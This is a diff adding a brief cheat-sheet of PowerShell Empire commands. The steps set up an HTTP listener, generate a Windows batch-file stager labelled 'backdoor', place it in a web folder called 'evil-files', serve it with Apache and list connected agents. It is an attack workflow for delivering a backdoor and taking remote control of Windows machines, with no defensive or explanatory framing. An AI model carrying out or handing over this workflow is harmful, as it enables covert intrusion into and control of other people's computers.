@@ -1,0 +1,16 @@
+powershell-empire server
+powershell-empire client
+<--------listener------------>
+use listener http
+set port
+set host address
+execute
+<----------backdoor---------->
+use stager windows/launcher_bat
+set listener http
+set outfile name empire_http_8080.bat
+copy the file into var/www/http/evil-files
+<---------->
+seervice apache2 start
+<---------->
+agents
